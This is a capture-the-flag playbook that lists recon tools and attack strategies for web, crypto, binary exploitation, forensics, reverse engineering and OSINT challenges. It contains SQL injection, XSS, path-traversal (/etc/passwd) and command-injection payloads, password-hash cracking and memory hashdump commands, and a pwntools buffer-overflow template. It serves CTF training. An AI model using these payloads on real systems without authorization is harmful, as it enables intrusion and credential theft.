# CTF Playbook

## Category Decision Tree

Identify the challenge category from the description, then follow the matching workflow.

## Web

### Recon Phase
```bash
# Technology detection
whatweb -v -a 3 <URL>
httpx -probe -tech-detect -status-code -title -content-length -u <URL>

# Content discovery
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,bak -t 50
feroxbuster -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt
dirsearch -u <URL> -e php,html,js,txt,xml,json -t 50

# JS and endpoint crawling
katana -u <URL> -depth 3 -js-crawl -form-extraction
gau <DOMAIN>
waybackurls <DOMAIN>

# Parameter discovery
arjun -u <URL> --get --post
paramspider -d <DOMAIN>
```

### Attack Phase — Strategies by Vulnerability Type

**SQL Injection**
```bash
sqlmap -u "<URL>?param=1" --batch --level 3 --risk 2 --threads 5
sqlmap -u "<URL>" --data="param=1" --batch  # POST
sqlmap -r request.txt --batch  # From saved request
# Manual: ' OR 1=1--, " OR 1=1--, ' UNION SELECT NULL--
# Blind: ' AND SLEEP(5)--, ' AND 1=1--
```

**XSS**
```bash
dalfox url "<URL>?param=test" --mining-dom --mining-dict --deep-domxss
# Manual payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>
# Filter bypass: <ScRiPt>alert(1)</ScRiPt>, <svg/onload=alert(1)>
```

**Directory Traversal**: `../../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2f`

**Authentication Bypass**: Default creds, JWT manipulation, cookie tampering, IDOR

**SSTI**: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` — if 49 appears, identify engine and escalate

**File Upload**: Bypass extension filters (.php5, .phtml, .phar), magic bytes, null byte, double extension

**Command Injection**: `; id`, `| id`, `$(id)`, `` `id` ``

## Crypto

### Identification
```bash
hash-identifier  # Interactive — paste hash
hashid -m <HASH>  # Shows hashcat mode numbers
file <FILE>  # Check if encrypted file
```

### Common Patterns
- **Base64**: Ends with `=` or `==`, charset `[A-Za-z0-9+/]`
- **Hex**: All `[0-9a-fA-F]`, even length
- **ROT13**: `echo "<TEXT>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
- **Caesar/shift**: Try all 25 shifts
- **Vigenère**: Frequency analysis → Kasiski examination → key length → solve
- **XOR**: Known plaintext XOR ciphertext = key (repeating)
- **RSA weak keys**: Small e with small m (cube root), common n (shared factor), Wiener's attack (large e), Fermat factoring (close p,q)

### Cracking
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=<FORMAT> <HASHFILE>
hashcat -m <MODE> -a 0 <HASHFILE> /usr/share/wordlists/rockyou.txt
```

Common hashcat modes: 0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 1000=NTLM

## Pwn (Binary Exploitation)

### Triage
```bash
file <BINARY>
checksec --file <BINARY>
strings -n 8 <BINARY> | head -50
objdump -d -M intel <BINARY> | head -100
readelf -a <BINARY> | grep -E "RELRO|STACK|NX|PIE"
```

### Checksec interpretation
- **No canary** → Stack buffer overflow viable
- **NX disabled** → Shellcode on stack
- **No PIE** → Fixed addresses for ROP
- **Partial RELRO** → GOT overwrite possible
- **No RELRO** → GOT overwrite easy

### Exploitation patterns
- **Buffer overflow (no protections)**: Find offset with cyclic pattern → overwrite RIP → shellcode or ret2win
- **ROP chain**: `ROPgadget --binary <BIN>` or `ropper --file <BIN> --search "pop rdi"`
- **ret2libc**: Leak libc address → calculate system/binsh offsets → call system("/bin/sh")
- **Format string**: `%p` to leak stack, `%n` to write, `%<offset>$p` for specific positions
- **Heap**: UAF, double-free, tcache poisoning, fastbin dup

### Pwntools template
```python
from pwn import *
context.binary = elf = ELF('./<binary>')
# p = process('./<binary>')  # Local
p = remote('<host>', <port>)  # Remote
# libc = ELF('./libc.so.6')

payload = b'A' * <OFFSET>
payload += p64(<ADDRESS>)
p.sendline(payload)
p.interactive()
```

## Forensics

### File Analysis
```bash
file <FILE>
binwalk <FILE>  # Identify embedded files
binwalk -e <FILE>  # Extract embedded files
foremost -i <FILE> -o /tmp/output  # Carve files
exiftool <FILE>  # Metadata (GPS, author, timestamps, comments)
xxd <FILE> | head -20  # Hex dump — check magic bytes
```

### Steganography
```bash
steghide extract -sf <IMAGE> -p ""  # Try empty password first
steghide extract -sf <IMAGE> -p "<PASSWORD>"
zsteg -a <PNG>  # PNG/BMP steg analysis
stegsolve  # Visual — bit planes, color channels
outguess -r <IMAGE> output.txt
jsteg reveal <JPEG>
```

### Memory Forensics
```bash
volatility -f <DUMP> imageinfo  # Identify OS profile
volatility -f <DUMP> --profile=<PROFILE> pslist  # Process list
volatility -f <DUMP> --profile=<PROFILE> filescan  # Find files
volatility -f <DUMP> --profile=<PROFILE> dumpfiles -Q <OFFSET> -D /tmp/  # Extract
volatility -f <DUMP> --profile=<PROFILE> hashdump  # Password hashes
volatility -f <DUMP> --profile=<PROFILE> consoles  # Command history
# Vol3: python3 vol.py -f <DUMP> windows.pslist.PsList
```

### Network Forensics
```bash
tshark -r <PCAP> -T fields -e http.request.uri  # HTTP URIs
tshark -r <PCAP> -Y "http" -T fields -e http.host -e http.request.uri
tshark -r <PCAP> -Y "tcp.stream eq 0" -T fields -e data  # Follow stream
tshark -r <PCAP> --export-objects http,/tmp/extracted/  # Extract files
# Look for: DNS exfil, HTTP POST data, FTP transfers, cleartext creds
```

## Rev (Reverse Engineering)

### Static Analysis
```bash
file <BINARY>
strings -n 8 <BINARY>  # Look for flags, passwords, URLs
objdump -d -M intel <BINARY>  # Disassembly
readelf -a <BINARY>  # ELF info
nm -D <BINARY>  # Dynamic symbols
# Ghidra headless: analyzeHeadless /tmp ghidra_project -import <BINARY> -postScript decompile.py
```

### Dynamic Analysis
```bash
ltrace ./<BINARY>  # Library calls (strcmp, strlen reveal comparisons)
strace -f ./<BINARY>  # System calls (open, read, write reveal file access)
gdb ./<BINARY>  # Then: break main, run, disassemble, x/s $rdi
```

### Anti-debugging bypass
- `ptrace` check: Patch `PTRACE_TRACEME` call or `LD_PRELOAD` a fake ptrace
- Time checks: Patch `time`/`gettimeofday` or run under controlled environment
- Packed binaries: `upx -d <BINARY>`, or manually dump from memory

## OSINT

```bash
sherlock <USERNAME>  # Find username across platforms
theHarvester -d <DOMAIN> -b all  # Email/subdomain harvesting
whois <DOMAIN>
dig <DOMAIN> any  # DNS records
nslookup -type=any <DOMAIN>
# Google dorks: site:<domain> filetype:pdf, inurl:admin, intitle:index.of
# Shodan: shodan search "hostname:<domain>"
```

## Misc

### Common Encodings
```bash
echo "<DATA>" | base64 -d
echo "<DATA>" | xxd -r -p  # Hex decode
echo "<DATA>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13
python3 -c "import codecs; print(codecs.decode('<DATA>', 'rot_13'))"
```

### QR/Barcode: `zbarimg <IMAGE>`
### Audio: Open in Audacity → spectrogram view (flags hidden in spectrum)
### Esoteric languages: Brainfuck (`+[->` patterns), Whitespace (spaces/tabs/newlines), Ook (Ook. Ook! Ook?)
